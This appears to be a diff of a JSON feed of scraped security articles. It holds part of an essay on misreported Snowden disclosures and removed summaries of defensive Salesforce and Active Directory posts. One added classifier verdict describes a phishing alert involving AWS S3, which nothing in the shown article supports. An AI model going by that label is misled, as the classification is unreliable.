\"Enduring Targets\", which means they are of long-term strategic importance and therefore require a holistic approach. Next there were 16 \"Topical Missions\", which are subject to some change, but can be considered legitimate targets for any large intelligence agency: - Winning the Global War on Terrorism (GWOT) - Protecting the US homeland - Combating proliferation of Weapons of Mass Destruction (WMD) - Protecting US military forces deployed overseas - Providing warning of impending state instability - Providing warning of a strategic nuclear missile attack - Monitoring regional tensions that could escalate - Preventing an attack on US critical information systems - Early detection of critical foreign military developments - Preventing technological surprise - Ensuring diplomatic advantage for the US - Ensuring a steady and reliable energy supply for the US - Countering foreign intelligence threats - Countering narcotics and transnational criminal networks - Mapping foreign military and civil communications infrastructure In 2013, terrorism was replaced by cyber attacks as top threat to American national security. Since then, cyber threats are increasing in frequency, scale, sophistication and severity of impact. > See also: NSA's Strategic Mission List Screenshot of the BOUNDLESSINFORMANT tool showing where the NSA collected most data Spying among friends For its mission of \"Ensuring Diplomatic Advantage for the U.S.\", the NSA intercepts the communications of numerous foreign governments and government leaders. Based upon documents from the Snowden trove, media reported about eavesdropping operations against the Mexican candidate for the presidency, Enrique Peña Nieto, Brazilian president Dilma Rousseff, the Venezuelan oil company PdVSA and many others. > See also: An NSA eavesdropping case study The NSA's interest in Germany's chancellor Angela Merkel had the most far-reaching consequences. Merkel herself made clear to president Obama that \"spying on friends is not acceptable\" ( Ausspähen unter Freunden, das geht gar nicht ) and the German parliament started an official investigation into the spying activities of the NSA ( NSA-Untersuchungsausschuss or #NSAUA ). This inquiry lasted from March 2014 to June 2017, but soon shifted its focus to Germany's own foreign intelligence agency BND. Extensive hearings of BND employees resulted in unprecedented insights into the details of the cable tapping and satellite interception operations which the BND conducted in cooperation with the NSA. Eventually it became clear that the NSA wasn't spying on German citizens, but did try to collect communications from European governments and companies of interest - just like the BND itself, which was also targeting American and French foreign ministers, the interior departments of EU member states, and many others. > See also: New details about the selectors NSA provided to BND German chancellor Angela Merkel holding a secure BlackBerry Z10 in 2013 (photo: Nicki Demarco/The Fold/The Washington Post) Backdoor tapping Google A disclosure that caused outrage in Silicon Valley was about MUSCULAR, a collection program in which the NSA cooperates with its British counterpart GCHQ. In October 2013, The Washington Post reported that under this program, the NSA had secretly broken into the main communications links between Yahoo and Google data centers around the world. A big question was: why would the NSA do that, given that they already had \"front door\" access to Google and Yahoo via the PRISM program? Gellman asked Snowden, who didn't come much further than \"Because it could\" and: \"I'm speculating, but NSA doesn't ignore low-hanging fruit\". Eventually Gellman realized that inside the US, the NSA had to specify individual targets, but abroad it was possible to acquire such data in bulk and to search and analyse it with XKEYSCORE . * The Post didn't mention the XKEYSCORE system by name and it's also not explained in Gellman's book Dark Mirror . That's unfortunate, because while Greenwald and Snowden presented XKEYSCORE as a global mass surveillance tool, it's actually a smart system to find targets who are communicating anonymously and therefore cannot be traced in the traditional way, via identifiers like phone numbers and e-mail addresses. It seems that hardly anyone realized that the disclosure of XKEYSCORE must have been really damaging for the NSA. In the 1990s, ECHELON made clear that the agency targeted phone numbers, so terrorists and other adversaries began avoiding individual identifiers and switched to anonymous ways to communicate. It must have been an eye-opener that with XKEYSCORE, the NSA found a way to trace those as well. > More about XKEYSCORE NSA slide showing where to intercept data from the Google cloud BOUNDLESSINFORMANT Where Section 215 was most controversial in the United States, but lesser-known in Europe, the opposite was the case with BOUNDLESSINFORMANT , which caused fury in Europe, but is hardly known across the ocean. BOUNDLESSINFORMANT isn't a system to collect data, but an internal visualization tool that counts metadata records to provide insights into the NSA's worldwide data collection. The results are shown in heat maps and charts, like for individual countries and collection programs. Such charts for Germany and a few other countries were published on July 29, 2013 by Der Spiegel, but on August 5, the German foreign intelligence agency BND said that they collected these data during military operations abroad and subsequently shared them with the NSA. Despite this statement, Glenn Greenwald interpreted these charts as evidence of American mass surveillance on European citizens and started publishing them in major European newspapers. > See also: BOUNDLESSINFORMANT only shows metadata BOUNDLESSINFORMANT chart showing the numbers of metadata which German BND shared with the NSA On October 21, for example, the French paper Le Monde published a story saying that \"telephone communications of French citizens are intercepted on a massive scale.\" After a similar story appeared in Spain, NSA director Keith Alexander came with a remarkable clarification, saying : \"This is not information that we collected on European citizens. It represents information that we and our NATO allies have collected in defense of our countries and in support of military operations.\" Greenwald continued his framing in Norwegian and Italian papers. Only in The Netherlands it was found out that the BOUNDLESSINFORMANT charts were not about content, but about metadata. Dutch interior minister Ronald Plasterk, however, still followed Greenwald's interpretation and assumed the Americans were spying on Dutch citizens. A court case forced the government to admit that Dutch military intelligence had collected the data during operations abroad. > See also: Dutch government tried to hide the truth about metadata collection Correction It was only in May 2019 that The Intercept put the pieces together and set the record straight: the various BOUNDLESSINFORMANT charts showed cellphone metadata that had been collected by members of the Afghanistan SIGINT Coalition (AFSC, also known as the 9 Eyes) and fed them into the NSA's Real-Time Regional Gateway (RT-RG) big data analysis platform. When The Intercept confronted Greenwald with this new research, he still tried to blame the NSA: \"At the time, Der Spiegel had already reported this interpretation, the NSA wouldn’t answer our questions, and they wouldn’t give us any additional information. I am totally in favor of correcting the record if the reporting was inaccurate.\" While Greenwald ignored the declaration by general Alexander, he was right when he said that the NSA's internal documentation about BOUNDLESSINFORMANT was somewhat confusing. Apparently, Greenwald had to rely on that documentation because Snowden was of little help, just like he was for various other programs that journalists did not fully understand. > See also: From 9-Eyes to 14-Eyes: the Afghanistan SIGINT Coalition (AFSC) Slide showing all the collection systems that fed the RT-RG platform (click to enlarge) Truth Many of the documents that Snowden provided to the press have been misinterpreted or exaggerated, sometimes unintentional, but in other cases maybe deliberately. In Dark Mirror , Barton Gellman writes: \"There were signs that Snowden was capable of an instrumental approach to truth. In conversations about my work, when I got stuck on a hard reporting problem, he sometimes suggested that I provoke fresh disclosures from government officials by pretending to know more than I did.\" \"Another time he went further, proposing that I actually publish informed speculation as fact. If my story outran the evidence, he said, the government would be forced to respond and thereby reveal more. There would be a net gain for public information either way.\" \"He said misinformation from people like Mike Hayden, supporters of the intelligence establishment, pushed the terms of debate so far off center that only rhetorical counterforce could set the record straight.\" * Gellman declined this approach because it would make his reporting unreliable and it undermines confidence in the press if it would turn out that certain things weren't true. However, claims made by Greenwald and Snowden himself showed that his \"counterforce\" method sometimes did work: the government came up with new facts - but those never got the same attention as the original story, which was already stuck in people's minds. Conclusion There's no doubt that the Snowden revelations provided unprecedented insight into modern-day signals intelligence as conducted by the NSA and its Five Eyes partners. In part this was much needed to understand how the legal framework is implemented and where safeguards need improvement. That, however, requires a close examination of the documents, which shows the problems are smaller and more complex than the mythical \"global mass surveillance\" which Snowden and Greenwald tried to proof. On the other hand, many things have been published that were merely sensational and weakened the US and its signals intelligence system. By revealing its workings and capacity, the Snowden revelations unintentionally set a new standard which other countries hurried to catch up with. Links - Der Spiegel: Das Internet ist heute anders unsicher (June 9, 2023) - The Atlantic: Did the Snowden Revelations Change Anything? (June 7, 2023) - The Guardian: Snowden, MI5 and me: how the leak of the century came to be published (June 7, 2023) - The Guardian: What’s really changed 10 years after the Snowden revelations? (June 7, 2023) - Schneier on Security: Snowden Ten Years Later (June 6, 2023) - System Update: SNOWDEN REVELATIONS 10-Year Anniversary: Glenn Greenwald Speaks with Snowden & Laura Poitras on the Past, Present, & Future of Their Historic Reporting (June 6, 2023) - neues deutschland: 10 Jahre Snowden-Leaks: Enthüllungen nicht mehr erwünscht (June 6, 2023) - neues deutschland: Snowden-Leaks: Geheimdokumente belegen globale Massenüberwachung (June 6, 2023) - Heise: Edward Snowden: Die Enthüllungen des NSA-Whistleblowers 10 Jahre später (June 5, 2023) - Der Tagesspiegel: Edward Snowden und die Whistleblower-Frage Feiert die Verräter! (June 2023) - Netkwesties: Barton Gellman herziet NSA-onthullingen (Dec. 7, 2020) - See also: Timeline of Edward Snowden - Documentary: Edward Snowden: Whistleblower or Spy? Comments at Hacker News",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Explore Security",
-      "title": "Exception Handling and Data Integrity in Salesforce",
-      "url": "http://www.exploresecurity.com/exception-handling-and-data-integrity-in-salesforce/",
-      "content": "Robust exception handling is one of the tenets of best practice for development, no matter what the coding language. This blog post, published in full on the NCC Group research site, explores the curious circumstances in which a developer trying to do the right thing – but without appreciating the full effects – could lead […]",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Explore Security",
-      "title": "Are you oversharing (in Salesforce)?",
-      "url": "http://www.exploresecurity.com/are-you-oversharing-in-salesforce/",
-      "content": "Unauthorised access to data is a primary concern of clients who commission a Salesforce assessment. The Salesforce documentation acknowledges that the sharing model is a “complex relationship between role hierarchies, user permissions, sharing rules, and exceptions for certain situations”. It is often said that complexity and security are natural enemies. Salesforce empowers its users with […]",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Explore Security",
-      "title": "Salesforce Security with Remote Working",
-      "url": "http://www.exploresecurity.com/salesforce-security-with-remote-working/",
-      "content": "With Coronavirus still active across the world, life is far from settled, but the uptake of remote working is surely here to stay. From a security standpoint, organisations may feel less comfortable at the moment simply because staff are working out of sight. Whether that feeling is justified will depend on the technical measures put […]",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Explore Security",
-      "title": "Salesforce Policy Deviation Checker",
-      "url": "http://www.exploresecurity.com/salesforce-policy-deviation-checker/",
-      "content": "SFPolDevChk is a quick tool to show which Profiles in a Salesforce instance have become desynced from an Organization in terms of password and session policies, with any deviations highlighted. Published as an NCC Group open source project.",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Explore Security",
-      "title": "Common Insecure Practices with Configuring and Extending Salesforce",
-      "url": "http://www.exploresecurity.com/common-insecure-practices-with-configuring-and-extending-salesforce/",
-      "content": "This blog post on the NCC Group research site discusses the most common findings from a sample of over 35 security assessments of Salesforce customer deployments. The assessments covered a mixture of configuration and code review, and the common issues were sorted into broad categories: Deviation From Salesforce Baseline Standard, Deviation From Security Best Practice, […]",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Detecting Fake Active Directory Password Changes",
-      "url": "https://adsecurity.org/?p=4969",
-      "content": "In Active Directory, there has been a method that’s been around for many years which changes the password last set date but not the actual password. This is what I call a “fake password change” since the account appears to have a recent password when scanning for old passwords based on password last set, but … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Active Directory Security Tip #16: Mitigating Kerberoast Attacks",
-      "url": "https://adsecurity.org/?p=4955",
-      "content": "There are two main password attacks leveraged by adversaries; one is called Password Spraying and the other is called Kerberoasting. This post focuses on identifying accounts that may be targeted for Kerberoasting and how to harden the environment against Kerberoasting. Password spraying involves the attacker using a list of passwords and for each password attempts … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Active Directory Security Tip #15: Active Directory Domain Root Permissions",
-      "url": "https://adsecurity.org/?p=4941",
-      "content": "This week let’s look at Active Directory domain permissions which are configured on the domain root and apply to the domain. There are many different type of concerning permissions, but let’s look at the most egregious. I wrote a PowerShell script leveraging the Active Directory PowerShell module that can help identify these permissions on the … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Active Directory Security Tip #14: Group Managed Service Accounts (GMSAs)",
-      "url": "https://adsecurity.org/?p=4904",
-      "content": "Group Managed Service Accounts (GMSAs) User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed. This means that the GMSA has to have security principals explicitly delegated … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Microsoft Interview",
-      "url": "https://adsecurity.org/?p=4802",
-      "content": "A couple years ago, the Microsoft Security Experts Blog interviewed me regarding Azure Active Directory (Entra ID) security. Read the Interview here",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Active Directory Security Tip #13: Reviewing Foreign Security Principals (FSPs)",
-      "url": "https://adsecurity.org/?p=4784",
-      "content": "Review the membership of groups for accounts and groups from another Active Directory forest (technically another domain, but using forest here). These are called “Foreign Security Principals” (FSPs) like the ones highlighted in the image. These FSPs are accounts that exist in another forest but have rights in the AD forest. Any FSPs should be … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "Active Directory Security Tip #12: Kerberos Delegation",
-      "url": "https://adsecurity.org/?p=4658",
-      "content": "I have mentioned in several presentations that Kerberos delegation is impersonation. Kerberos delegation is used when a service (ex. web server) needs to impersonate a user when connecting to a resource (ex. database). There are a 4 types of Kerberos delegation: Unconstrained delegation should be converted to constrained delegation due to security concerns. Any Kerberos … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
-      }
-    },
-    {
-      "source": "Active Directory & Azure AD/Entra ID Security",
-      "title": "The History of Active Directory Security",
-      "url": "https://adsecurity.org/?p=4706",
-      "content": "During the Summer of 2024, I had a talk at Troopers called “A Decade of Active Directory Attacks:What We’ve Learned & What’s Next” (Slides & Video) where I focused on the key milestones of Active Directory security (history). This article covers my “decade of Active Directory attacks” in some detail which was correlated with public … Continue reading",
-      "timestamp": "2026-05-20T11:22:52.226668+00:00",
-      "gemma_verdict": {
-        "relevant": true,
-        "justification": "Gemma skipped (--skip-gemma)",
-        "mitre_tactic_hint": ""
+        "is_relevant": true,
+        "confidence_score": 7,
+        "primary_domain": "Identity",
+        "primary_platform": "AWS",
+        "reasoning_summary": "The text mentions a phishing alert involving credential theft and the use of AWS S3, indicating an identity-focused attack vector."
       }
     }
   ]
